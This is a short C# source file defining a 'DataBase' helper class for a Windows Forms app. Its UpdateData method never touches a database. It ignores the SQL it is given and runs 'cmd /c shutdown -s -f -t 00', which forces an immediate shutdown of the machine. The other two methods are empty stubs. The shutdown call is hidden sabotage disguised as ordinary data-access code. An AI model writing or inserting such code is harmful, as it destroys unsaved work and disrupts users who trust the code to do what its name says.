using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WindowsFormsApp3
{
    internal class DataBase
    {
        public void OpenConnection()
        {

        }

        public DataTable UpdateData(string sql)
        {
            System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
            return new DataTable();
        }

        public void CloseConnection()
        {

        }
    }
}
